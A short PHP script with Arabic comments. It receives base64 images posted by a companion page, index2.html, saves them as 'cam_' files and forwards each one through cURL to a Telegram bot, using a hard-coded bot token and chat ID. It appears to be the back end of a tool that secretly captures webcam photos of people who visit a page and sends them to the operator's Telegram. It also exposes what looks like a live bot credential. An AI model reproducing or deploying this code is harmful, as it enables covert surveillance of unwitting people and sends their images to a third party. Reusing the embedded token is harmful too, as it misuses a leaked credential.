<?php
// إعدادات البوت والبيانات الخاصة بك
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

// استقبال البيانات (نستقبل المتغير img الذي يرسله index2.html)
$imageData = isset($_POST['img']) ? $_POST['img'] : null;

if (!empty($imageData)) {
    // 1. تنظيف البيانات وفك التشفير
    $filteredData = substr($imageData, strpos($imageData, ",")+1);
    $unencodedData = base64_decode($filteredData);
    
    // 2. إنشاء ملف مؤقت باسم فريد (لضمان عدم تداخل الصور عند الإرسال السريع)
    $tempFileName = 'cam_' . time() . '_' . rand(1000,9999) . '.png';
    file_put_contents($tempFileName, $unencodedData);

    // 3. رابط الإرسال إلى تلجرام
    $url = "https://api.telegram.org/bot" . $botToken . "/sendPhoto";

    // 4. إعداد البيانات للإرسال
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($tempFileName))
    ];

    // 5. عملية الإرسال باستخدام CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // 6. الحذف الآمن للملف المؤقت بعد الإرسال
    if (file_exists($tempFileName)) {
        unlink($tempFileName);
    }
}
?>